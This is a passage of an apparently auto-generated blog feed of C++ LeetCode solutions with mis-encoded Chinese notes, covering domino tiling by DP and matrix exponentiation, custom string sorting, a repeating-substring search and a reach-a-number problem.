class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">double</span>&gt; frac;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numTilings</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        frac = <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(n+<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            frac[i] = (i * frac[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">calcualte</span>(n, n, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">calcualte</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n, <span class="type">int</span> count, <span class="type">double</span> div)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = n/k; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="type">double</span> div1 = (div*frac[i]);</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = (n-i*k)/k; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                    <span class="built_in">calcualte</span>(k<span class="number">-1</span>, n - i*k - j*k, count + i + j, (div1*frac[j]) );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = n/k; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="built_in">calcualte</span>(k<span class="number">-1</span>, n-i*k, count + i, (div*frac[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sum = <span class="built_in">int</span>(sum + frac[count + n]/div/frac[n])%<span class="number">1000000007</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ²¡é€šè¿‡ï¼Œæ€è·¯ä¸å¯¹ï¼Œç®—é˜¶ä¹˜æº¢å‡ºï¼Œæ‰¾å‡ºæ‰€æœ‰ç»„åˆçš„ä»£ä»·ä¹Ÿå¤ªå¤§</p></blockquote><blockquote><p>åœ¨è¿™ä¸ªåœ°æ–¹æˆ‘çŠ¯äº†ä¸€ä¸ªé”™è¯¯ï¼Œå°±æ˜¯è®¤ä¸º $ \frac{a}{b} \quad mod\quad c &#x3D; \frac{a\quad mod\quad c}{b\quad mod\quad c} $<br>æ­£ç¡®çš„å…³ç³»æ˜¯ï¼Œ $ \frac{a}{b}\quad mod\quad c &#x3D; \frac{a\quad mod\quad (b \cdot c)}{b} $ ï¼Œè¯æ˜ï¼š<br>$ \frac{a}{b}\quad mod\quad c &#x3D; k $<br>$ \frac{a}{b} &#x3D; x \cdot c + k $<br>$ a  &#x3D; b \cdot x \cdot c + b \cdot k $<br>$ a\quad mod\quad (b \cdot c) &#x3D; b \cdot k $<br>$ a\quad mod\quad (b \cdot c) &#x2F; b &#x3D; k $<br>$ \frac{a}{b}\quad mod\quad c &#x3D; \frac{a\quad mod\quad (b \cdot c)}{b} $</p></blockquote><blockquote><p>$ a^n \quad mod \quad c &#x3D; (a \cdot a^{n-1}) \quad mod \quad c &#x3D; ((a \quad mod \quad c) \cdot (a^{n-1} \quad mod \quad c)) \quad mod \quad c$</p></blockquote><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MOD 1000000007</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numTilings</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">4</span>, <span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">3</span>];</span><br><span class="line">            dp[i][<span class="number">1</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">2</span>])%MOD;</span><br><span class="line">            dp[i][<span class="number">2</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">1</span>])%MOD;</span><br><span class="line">            dp[i][<span class="number">3</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">1</span>] + dp[i<span class="number">-1</span>][<span class="number">2</span>] + dp[i<span class="number">-1</span>][<span class="number">3</span>])%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n][<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p><img src="https://assets.leetcode-cn.com/solution-static/790/1.png"></p></blockquote><h3 id="å¿«é€Ÿå¹‚"><a href="#å¿«é€Ÿå¹‚" class="headerlink" title="å¿«é€Ÿå¹‚"></a>å¿«é€Ÿå¹‚</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MOD 1000000007</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numTilings</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; pow = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;</span><br><span class="line">        &#125;, base = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        pow = <span class="built_in">matPow</span>(pow, n, <span class="number">4</span>);</span><br><span class="line">        base = <span class="built_in">matMul</span>(pow, base, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> base[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">matPow</span>(vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; a, <span class="type">int</span> pow, <span class="type">int</span> m) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">res</span>(m, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(m));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            res[i][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pow) &#123;</span><br><span class="line">            <span class="keyword">if</span>(pow&amp;<span class="number">1</span>) &#123;</span><br><span class="line">                res = <span class="built_in">matMul</span>(a, res,m,m,m);</span><br><span class="line">            &#125;</span><br><span class="line">            a = <span class="built_in">matMul</span>(a, a,m,m,m);</span><br><span class="line">            pow = pow &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">matMul</span>(vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; a, vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; b, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">c</span>(m, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(k));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">                <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> l = <span class="number">0</span>; l &lt; n; l++) &#123;</span><br><span class="line">                    sum = (sum + (a[i][l]*b[l][j])%MOD)%MOD;</span><br><span class="line">                &#125;</span><br><span class="line">                c[i][j] = sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="791-è‡ªå®šä¹‰å­—ç¬¦ä¸²æ’åº"><a href="#791-è‡ªå®šä¹‰å­—ç¬¦ä¸²æ’åº" class="headerlink" title="791. è‡ªå®šä¹‰å­—ç¬¦ä¸²æ’åº"></a><a href="https://leetcode.cn/problems/custom-sort-string/">791. è‡ªå®šä¹‰å­—ç¬¦ä¸²æ’åº</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">customSortString</span><span class="params">(string order, string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> lenO = order.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> argOrder[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; lenO; i++) &#123;</span><br><span class="line">            argOrder[order[i]-<span class="string">&#x27;a&#x27;</span>] = i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), [&amp;](<span class="type">char</span> x, <span class="type">char</span> y) -&gt; <span class="type">bool</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> argOrder[x-<span class="string">&#x27;a&#x27;</span>] &lt; argOrder[y-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1668-æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²&quot;&gt;&lt;a href=&quot;#1668-æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²&quot; class=&quot;headerlink&quot; title=&quot;1668. æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/maximum-repeating-substring/&quot;&gt;1668. æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;maxRepeating&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string sequence, string word)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len1 = sequence.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len2 = word.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; maxk = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, k = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len1;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; next = i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag1 = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; len2; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(sequence[i+j] != word[j]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    flag = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!flag1 &amp;amp;&amp;amp; j != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; sequence[i+j] == word[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    next = i+j;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    flag1=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; k &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; maxk &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(flag) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                k++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                i += len2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                maxk = &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(k, maxk);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(k == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    i+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    i = i-len2+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                k = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(maxk, k);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;ç¬¨æ–¹æ³•ï¼Œä»å³å‘å·¦æ‰¾ï¼Œé€‚å½“å›æº¯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;754-åˆ°è¾¾ç»ˆç‚¹æ•°å­—&quot;&gt;&lt;a href=&quot;#754-åˆ°è¾¾ç»ˆç‚¹æ•°å­—&quot; class=&quot;headerlink&quot; title=&quot;754. åˆ°è¾¾ç»ˆç‚¹æ•°å­—&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/reach-a-number/&quot;&gt;754. åˆ°è¾¾ç»ˆç‚¹æ•°å­—&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&quot;è§£æ³•1&quot;&gt;&lt;a href=&quot;#è§£æ³•1&quot; class=&quot;headerlink&quot; title=&quot;è§£æ³•1&quot;&gt;&lt;/a&gt;è§£æ³•1&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;reachNumber&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; target)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        target = &lt;span class=&quot;built_in&quot;&gt;abs&lt;/span&gt;(target);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n = (&lt;span class=&quot;built_in&quot;&gt;sqrt&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;8.0&lt;/span&gt;*target+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//8.0,é˜²æ­¢intæº¢å‡º&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; sum = (n+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)*n/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(sum == target) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span 